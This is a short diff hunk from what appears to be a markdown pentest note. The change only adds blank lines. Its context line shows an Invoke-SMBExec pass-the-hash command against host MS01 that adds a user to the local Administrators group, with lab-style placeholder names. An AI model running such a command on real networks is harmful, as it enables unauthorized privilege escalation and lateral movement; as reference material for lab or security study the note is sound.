@@ -18,3 +18,5 @@ updated_at: '2023-05-29T16:48:52.884824+00:00'
 Invoke-SMBExec -Target MS01 -Domain EVILCORP -Username elliot -Hash 31d6cfe0d16ae931b73c59d7e0c089c0 -Command "net localgroup administrators evil\elliot /add"
 
 ```
+
+
